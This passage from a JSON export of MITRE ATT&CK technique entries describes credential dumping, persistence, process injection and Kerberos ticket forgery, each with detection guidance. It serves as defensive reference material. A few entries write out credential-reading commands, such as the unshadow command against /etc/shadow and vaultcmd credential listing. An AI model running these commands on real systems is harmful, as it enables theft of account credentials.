instance metadata API.",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1555.006",
      "stix_id": "attack-pattern--cfb525cc-5494-401d-a82b-2539ca46a561",
      "created": "2023-09-25T12:41:26.501000+00:00",
      "modified": "2025-04-15T22:03:00.834000+00:00",
      "platforms": [
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Cloud Service: Cloud Service Enumeration"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1213.003": {
      "id": "T1213.003",
      "name": "Code Repositories",
      "description": "Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.\n\nOnce adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or [Unsecured Credentials](https://attack.mitre.org/techniques/T1552) contained within software's source code.  Having access to software's source code may allow adversaries to develop [Exploits](https://attack.mitre.org/techniques/T1587/004), while credentials may provide access to additional resources using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: Wired Uber Breach)(Citation: Krebs Adobe)\n\n**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1593/003), which focuses on conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043) via public code repositories.",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1213.003",
      "stix_id": "attack-pattern--cff94884-3b1c-4987-a70b-6d5643c621c3",
      "created": "2021-05-11T18:51:16.343000+00:00",
      "modified": "2025-04-15T22:04:59.867000+00:00",
      "platforms": [
        "SaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Logon Session: Logon Session Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor access to code repositories, especially performed by privileged users such as Active Directory Domain or Enterprise Administrators as these types of accounts should generally not be used to access code repositories. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user-based anomalies."
    },
    "T1565.002": {
      "id": "T1565.002",
      "name": "Transmitted Data Manipulation",
      "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1565.002",
      "stix_id": "attack-pattern--d0613359-5781-4fd2-b5be-c269270be1f6",
      "created": "2020-03-02T14:27:00.693000+00:00",
      "modified": "2025-04-15T23:16:50.965000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Detecting the manipulation of data as at passes over a network can be difficult without the appropriate tools. In some cases integrity verification checks, such as file hashing, may be used on critical files as they transit a network. With some critical processes involving transmission of data, manual or out-of-band integrity checking may be useful for identifying manipulated data. "
    },
    "T1003.008": {
      "id": "T1003.008",
      "name": "/etc/passwd and /etc/shadow",
      "description": "Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information, including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)\n\nLinux stores user information such as user ID, group ID, home directory path, and login shell in <code>/etc/passwd</code>. A \"user\" on the system may belong to a person or a service. All password hashes are stored in <code>/etc/shadow</code> - including entries for users with no passwords and users with locked or disabled accounts.(Citation: Linux Password and Shadow File Formats)\n\nAdversaries may attempt to read or dump the <code>/etc/passwd</code> and <code>/etc/shadow</code> files on Linux systems via command line utilities such as the <code>cat</code> command.(Citation: Arctic Wolf) Additionally, the Linux utility <code>unshadow</code> can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper - for example, via the command <code>/usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>(Citation: nixCraft - John the Ripper). Since the user information stored in <code>/etc/passwd</code> are linked to the password hashes in <code>/etc/shadow</code>, an adversary would need to have access to both.",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1003.008",
      "stix_id": "attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4",
      "created": "2020-02-11T18:46:56.263000+00:00",
      "modified": "2025-04-15T19:59:09.955000+00:00",
      "platforms": [
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Access",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes attempting to access <code>/etc/passwd</code> and <code>/etc/shadow</code>, alerting on the pid, process name, and arguments of such programs."
    },
    "T1543.001": {
      "id": "T1543.001",
      "name": "Launch Agent",
      "description": "Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.(Citation: AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware) Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time.(Citation: OSX.Dok Malware) Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.\n\n Launch Agents can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001) command.\n \nAdversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>.(Citation: Sofacy Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.(Citation: OSX Malware Detection)(Citation: OceanLotus for OS X) ",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1543.001",
      "stix_id": "attack-pattern--d10cbd34-42e3-45c0-84d2-535a09849584",
      "created": "2020-01-17T16:10:58.592000+00:00",
      "modified": "2025-04-15T19:59:10.035000+00:00",
      "platforms": [
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Service: Service Modification",
        "File: File Creation",
        "Service: Service Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor Launch Agent creation through additional plist files and utilities such as Objective-See\u2019s  KnockKnock application. Launch Agents also require files on disk for persistence which can also be monitored via other file monitoring applications.\n\nEnsure Launch Agent's <code> ProgramArguments </code> key pointing to executables located in the <code>/tmp</code> or <code>/shared</code> folders are in alignment with enterprise policy. Ensure all Launch Agents with the <code>RunAtLoad</code> key set to <code>true</code> are in alignment with policy. "
    },
    "T1569": {
      "id": "T1569",
      "name": "System Services",
      "description": "Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1569",
      "stix_id": "attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253",
      "created": "2020-03-10T18:23:06.482000+00:00",
      "modified": "2025-04-15T19:59:10.127000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Modification",
        "Process: Process Creation",
        "Service: Service Creation",
        "File: File Modification",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for command line invocations of tools capable of modifying services that doesn\u2019t correspond to normal usage patterns and known software, patch cycles, etc. Also monitor for changes to executables and other files associated with services. Changes to Windows services may also be reflected in the Registry."
    },
    "T1059.003": {
      "id": "T1059.003",
      "name": "Windows Command Shell",
      "description": "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1059.003",
      "stix_id": "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62",
      "created": "2020-03-09T14:12:31.196000+00:00",
      "modified": "2025-04-15T19:59:10.209000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Usage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script."
    },
    "T1055.009": {
      "id": "T1055.009",
      "name": "Proc Memory",
      "description": "Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. \n\nProc memory injection involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes\u2019 stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes\u2019 memory map within <code>/proc/[pid]/maps</code> can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux Injection)(Citation: DD Man) \n\nOther techniques such as [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) may be used to populate a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), proc memory injection may target child processes (such as a backgrounded copy of sleep).(Citation: GDS Linux Injection) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process. ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1055.009",
      "stix_id": "attack-pattern--d201d4cc-214d-4a74-a1ba-b3fa09fd4591",
      "created": "2020-01-14T01:34:10.588000+00:00",
      "modified": "2025-04-25T14:48:08.263000+00:00",
      "platforms": [
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "File system monitoring can determine if /proc files are being modified. Users should not have permission to modify these in most cases. \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. "
    },
    "T1650": {
      "id": "T1650",
      "name": "Acquire Access",
      "description": "Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems.(Citation: Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers)(Citation: Krebs Access Brokers Fortune 500) In some cases, adversary groups may form partnerships to share compromised systems with each other.(Citation: CISA Karakurt 2022)\n\nFootholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., [Web Shell](https://attack.mitre.org/techniques/T1505/003)) or established access via [External Remote Services](https://attack.mitre.org/techniques/T1133). In some cases, access brokers will implant compromised systems with a \u201cload\u201d that can be used to install additional malware for paying customers.(Citation: Microsoft Ransomware as a Service)\n\nBy leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.(Citation: Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers)\n\nIn some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a [Trusted Relationship](https://attack.mitre.org/techniques/T1199), [Multi-Factor Authentication Interception](https://attack.mitre.org/techniques/T1111), or even [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195).\n\n**Note:** while this technique is distinct from other behaviors such as [Purchase Technical Data](https://attack.mitre.org/techniques/T1597/002) and [Credentials](https://attack.mitre.org/techniques/T1589/001), they may often be used in conjunction (especially where the acquired foothold requires [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1650",
      "stix_id": "attack-pattern--d21bb61f-08ad-4dc1-b001-81ca6cb79954",
      "created": "2023-03-10T15:37:21.782000+00:00",
      "modified": "2025-04-15T21:43:51.840000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this takes place outside the visibility of the target organization, making detection difficult for defenders. \n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access. "
    },
    "T1601.001": {
      "id": "T1601.001",
      "name": "Patch System Image",
      "description": "Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.(Citation: Killing the myth of Cisco IOS rootkits) (Citation: Killing IOS diversity myth) (Citation: Cisco IOS Shellcode) (Citation: Cisco IOS Forensics Developments) (Citation: Juniper Netscreen of the Dead) Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.\n\nTo change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.\n\nTo change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.\n\nIn the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.\n\nBy modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via [Weaken Encryption](https://attack.mitre.org/techniques/T1600), authentication, via [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004), and perimeter defenses, via [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599).  Adding new capabilities for the adversary\u2019s purpose include [Keylogging](https://attack.mitre.org/techniques/T1056/001), [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003), and [Port Knocking](https://attack.mitre.org/techniques/T1205/001).\n\nAdversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with [Downgrade System Image](https://attack.mitre.org/techniques/T1601/002), one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. \n\nWhen the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via [TFTP Boot](https://attack.mitre.org/techniques/T1542/005). \n\nWhen the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) to achieve persistence. ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1601.001",
      "stix_id": "attack-pattern--d245808a-7086-4310-984a-a84aaaa43f8f",
      "created": "2020-10-19T19:49:24.129000+00:00",
      "modified": "2025-04-25T14:48:09.178000+00:00",
      "platforms": [
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Compare the checksum of the operating system file with the checksum of a known good copy from a trusted source.  Some embedded network device platforms may have the capability to calculate the checksum of the file, while others may not.  Even for those platforms that have the capability, it is recommended to download a copy of the file to a trusted computer to calculate the checksum with software that is not compromised.(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)\n\nMany vendors of embedded network devices can provide advanced debugging support that will allow them to work with device owners to validate the integrity of the operating system running in memory.  If a compromise of the operating system is suspected, contact the vendor technical support and seek such services for a more thorough inspection of the current running system.  (Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)"
    },
    "T1558.002": {
      "id": "T1558.002",
      "name": "Silver Ticket",
      "description": "Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.(Citation: ADSecurity Silver Tickets)\n\nSilver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.(Citation: ADSecurity Detecting Forged Tickets)\n\nPassword hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1558.002",
      "stix_id": "attack-pattern--d273434a-448e-4598-8e14-607f4a0d5e27",
      "created": "2020-02-11T19:14:48.309000+00:00",
      "modified": "2025-04-25T14:48:09.547000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4634, 4672).(Citation: ADSecurity Detecting Forged Tickets) \n\nMonitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored."
    },
    "T1213": {
      "id": "T1213",
      "name": "Data from Information Repositories",
      "description": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, such as Credential Access, Lateral Movement, or Defense Evasion, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization (i.e., [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537)). \n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)) \n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n* Contact or other sensitive information about business partners and customers, including personally identifiable information (PII) \n\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include the following:\n\n* Storage services such as IaaS databases, enterprise databases, and more specialized platforms such as customer relationship management (CRM) databases \n* Collaboration platforms such as SharePoint, Confluence, and code repositories\n* Messaging platforms such as Slack and Microsoft Teams \n\nIn some cases, information repositories have been improperly secured, typically by unintentionally allowing for overly-broad access by all users or even public access to unauthenticated users. This is particularly common with cloud-native or cloud-hosted services, such as AWS Relational Database Service (RDS), Redis, or ElasticSearch.(Citation: Mitiga)(Citation: TrendMicro Exposed Redis 2020)(Citation: Cybernews Reuters Leak 2022)",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1213",
      "stix_id": "attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-15T22:15:46.213000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS",
        "SaaS",
        "IaaS",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Creation",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.\n\nThe user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging) Sharepoint audit logging can also be configured to report when a user shares a resource. (Citation: Sharepoint Sharing Events) The user access logging within Atlassian's Confluence can also be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities. "
    },
    "T1070.009": {
      "id": "T1070.009",
      "name": "Clear Persistence",
      "description": "Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, [Modify Registry](https://attack.mitre.org/techniques/T1112), [Plist File Modification](https://attack.mitre.org/techniques/T1647), or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence.(Citation: Cylance Dust Storm) Adversaries may also delete accounts previously created to maintain persistence (i.e. [Create Account](https://attack.mitre.org/techniques/T1136)).(Citation: Talos - Cisco Attack 2022)\n\nIn some instances, artifacts of persistence may also be removed once an adversary\u2019s persistence is executed in order to prevent errors with the new instance of the malware.(Citation: NCC Group Team9 June 2020)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1070.009",
      "stix_id": "attack-pattern--d2c4e5ea-dbdf-4113-805a-b1e2a337fb33",
      "created": "2022-07-29T19:32:11.552000+00:00",
      "modified": "2025-04-16T20:37:21.515000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Deletion",
        "User Account: User Account Deletion",
        "File: File Modification",
        "Windows Registry: Windows Registry Key Modification",
        "Process: Process Creation",
        "Windows Registry: Windows Registry Key Deletion",
        "Scheduled Job: Scheduled Job Modification",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1059.012": {
      "id": "T1059.012",
      "name": "Hypervisor CLI",
      "description": "Adversaries may abuse hypervisor command line interpreters (CLIs) to execute malicious commands. Hypervisor CLIs typically enable a wide variety of functionality for managing both the hypervisor itself and the guest virtual machines it hosts. \n\nFor example, on ESXi systems, tools such as `esxcli` and `vim-cmd` allow administrators to configure firewall rules and log forwarding on the hypervisor, list virtual machines, start and stop virtual machines, and more.(Citation: Broadcom ESXCLI Reference)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: LOLESXi) Adversaries may be able to leverage these tools in order to support further actions, such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1059.012",
      "stix_id": "attack-pattern--d2d642da-61ff-4211-b4df-7923c9ca220c",
      "created": "2025-03-26T20:01:13.412000+00:00",
      "modified": "2025-04-15T21:24:59.280000+00:00",
      "platforms": [
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1555.004": {
      "id": "T1555.004",
      "name": "Windows Credential Manager",
      "description": "Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker)\n\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\n\nCredential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault)\n\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)\n\nAdversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the \u201cBack up...\u201d button on the \u201cStored User Names and Passwords\u201d GUI.\n\nPassword recovery tools may also obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1555.004",
      "stix_id": "attack-pattern--d336b553-5da9-46ca-98a8-0b23f49fb447",
      "created": "2020-11-23T15:35:53.793000+00:00",
      "modified": "2025-04-15T23:21:30.628000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Access",
        "Command: Command Execution",
        "Process: OS API Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor process and command-line parameters of <code>vaultcmd.exe</code> for suspicious activity, such as listing credentials from the Windows Credentials locker (i.e., <code>vaultcmd /listcreds:\u201cWindows Credentials\u201d</code>).(Citation: Malwarebytes The Windows Vault)\n\nConsider monitoring API calls such as <code>CredEnumerateA</code> that may list credentials from the Windows Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)\n\nConsider monitoring file reads to Vault locations, <code>%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\</code>, for suspicious activity.(Citation: Malwarebytes The Windows Vault)"
    },
    "T1036.010": {
      "id": "T1036.010",
      "name": "Masquerade Account Name",
      "description": "Adversaries may match or approximate the names of legitimate accounts to make newly created ones appear benign. This will typically occur during [Create Account](https://attack.mitre.org/techniques/T1136), although accounts may also be renamed at a later date. This may also coincide with [Account Access Removal](https://attack.mitre.org/techniques/T1531) if the actor first deletes an account before re-creating one with the same name.(Citation: Huntress MOVEit 2023)\n\nOften, adversaries will attempt to masquerade as service accounts, such as those associated with legitimate software, data backups, or container cluster management.(Citation: Elastic CUBA Ransomware 2022)(Citation: Aquasec Kubernetes Attack 2023) They may also give accounts generic, trustworthy names, such as \u201cadmin\u201d, \u201chelp\u201d, or \u201croot.\u201d(Citation: Invictus IR Cloud Ransomware 2024) Sometimes adversaries may model account names off of those already existing in the system, as a follow-on behavior to [Account Discovery](https://attack.mitre.org/techniques/T1087).  \n\nNote that this is distinct from [Impersonation](https://attack.mitre.org/techniques/T1656), which describes impersonating specific trusted individuals or organizations, rather than user or service account names.  ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1036.010",
      "stix_id": "attack-pattern--d349c66e-18e1-4d8b-a2d7-65af7cbd2ba0",
      "created": "2024-08-05T21:39:16.274000+00:00",
      "modified": "2025-04-15T22:48:14.966000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "SaaS",
        "IaaS",
        "Containers",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1200": {
      "id": "T1200",
      "name": "Hardware Additions",
